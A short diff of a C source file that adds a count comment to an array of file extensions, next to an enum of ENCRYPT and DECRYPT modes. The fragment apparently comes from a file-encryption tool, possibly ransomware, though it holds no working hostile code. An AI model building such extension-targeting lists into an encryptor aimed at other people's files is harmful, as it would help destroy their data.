@@ -13,7 +13,7 @@ const char extensions[][7] = {
   "pas", "pdf", "php", "png", "ppt", "pptx",   "py",   "rar",  "raw",  "rtf",
   "rpx", "sav", "sql", "svg", "swf", "tar",    "txt",  "vbs",  "wav",  "wma",
   "wmv", "xls", "xml", "xps", "zip"
-};
+}; // 75
 
 enum option { ENCRYPT, DECRYPT };
 typedef const char* string;
